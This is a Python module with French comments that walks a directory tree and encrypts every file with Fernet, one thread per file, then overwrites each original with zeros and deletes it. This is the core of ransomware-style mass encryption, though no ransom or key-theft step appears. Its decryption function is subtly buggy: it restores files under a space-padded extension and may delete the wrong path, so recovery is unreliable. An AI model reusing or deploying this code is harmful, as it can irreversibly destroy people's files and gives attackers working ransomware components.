# Import :
import os, threading
from cryptography.fernet import Fernet


class generateThread(threading.Thread):
    # Classe de création des thread
    def __init__(self, threadID, key, file):
        """ Fonction d'initialisation de la classe
        :param threadID -- permet de connaitre le numéro du thread:
        :param key -- clés de chiffrement:
        :param file -- chemin et nom du fichier à chiffrer:
        """
        # Héritage de classe mère "Thread" obligatoire
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.key = key
        self.file = file

    def run(self):
        """
        Cette fonction est appelée dès qu'un thread est démarré
        -> Fonction start() de la classe mère "Thread"
        """
        # Affiche le numéro du thread (Débugging)
        print("Starting " + str(self.threadID))
        # Call des fonctions
        encryptionFunction(self.key, self.file)
        overwriteFile(self.file)
        print("Exiting " + str(self.threadID))


def listFiles(path):
    """ Liste les fichiers d'un dossier et de ses sous-dossiers
    :param path -- chemin vers le dossier:
    :return -- renvoie une liste des fichiers:
    """
    # variables
    # Liste contenant les noms des fichiers
    liste_des_fichiers = []

    # Loop pour récupérer les chemins et noms des fichiers
    for currentDirectory, subDirectories, files in os.walk(path):
        for file in files:
            fullPathFilename = (os.path.join(path + os.path.relpath(currentDirectory, path), file))
            liste_des_fichiers.append(fullPathFilename)

    # On retourne la liste des fichiers
    return liste_des_fichiers


def encryptionFunction(key, fichier_non_chiffré):
    """ fonction de chiffrement
    :param key -- clés de chiffrement:
    :param filename -- fichier à chiffrer:
    """
    # Variales
    # Génération du cipher
    cipher_suite = Fernet(key)
    filename, file_extension = os.path.splitext(fichier_non_chiffré)
    # Padding de l'extension (8 bits dont dédiés à l'extension)
    file_extension += ' ' * (8 - (len(file_extension) % 8))

    with open(fichier_non_chiffré, 'rb') as file_handler:
        # Lecture du fichier
        chunk_read = file_handler.read()
        # Chiffrement du contenu
        cipher_text = cipher_suite.encrypt(chunk_read)

        # Création du fichier chiffré
        with open(filename + ".enc", 'wb') as file_encrypt:
            # Ecriture de l'extension du fichier d'origine
            file_encrypt.write(file_extension.encode())
            # Ecriture du contenu chiffré
            file_encrypt.write(cipher_text)


def decryptionFunction(key, fichier_chiffré):
    """ fonction de déchiffrement
    :param key -- clés de chiffrement:
    :param filename -- fichier à déchiffrer:
    """
    # génération du cipher
    cipher_suite = Fernet(key)
    # séparation du nom de fichier et de l'extension
    nom_de_fichier_sans_extension, _ = os.path.splitext(fichier_chiffré)

    with open(nom_de_fichier_sans_extension + '.enc', 'rb') as encrypt_file:
        # Lecture de l'extension dans le fichier chiffré
        extension_de_fichier_avec_8_caractéres = encrypt_file.read(8).decode()
        extension_sans_8_caractéres = ''
        # Elémination des espaces de l'extension
        for letter in extension_de_fichier_avec_8_caractéres:
            if letter == ' ':
                pass
            else:
                extension_sans_8_caractéres += letter

        # Lecture du contenu chiffré
        cipher_text = encrypt_file.read()

        # Appelle de la fonction de déchiffrement
        plain_text = cipher_suite.decrypt(cipher_text)
        # Ecriture du contenu non chiffré dans un nouveau fichier
        with open(nom_de_fichier_sans_extension + extension_de_fichier_avec_8_caractéres, 'wb') as decrypt_file:
             decrypt_file.write(plain_text)

    # Suppression du fichier chiffré
    os.remove(fichier_chiffré)


def overwriteFile(filename):
    """ Overwrite un fichier avec des zéros.
    :param filename -- fichier à remplir de zéros:
    """

    # récupére des informations statistiques sur le fichier
    stat = os.stat(filename)

    with open(filename, 'r+') as of:
        # Rempli de zéro le fichier en se basant sur sa taille
        of.write('\0' * stat.st_size)
        # Flush le buffer du fichier
        of.flush()
    # Suppression du fichier
    os.remove(filename)
